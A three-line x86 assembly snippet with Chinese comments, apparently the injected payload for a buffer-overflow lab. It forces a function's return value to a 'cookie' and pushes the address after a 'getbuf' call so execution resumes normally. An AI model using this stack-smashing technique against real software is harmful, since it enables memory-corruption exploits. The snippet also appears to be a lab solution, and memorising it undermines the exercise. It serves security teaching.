movl $0x4da06a04, %eax	# 将返回值修改为 cookie
push $0x8048e81		# 将 call getbuf 下一条要执行的指令压栈
ret
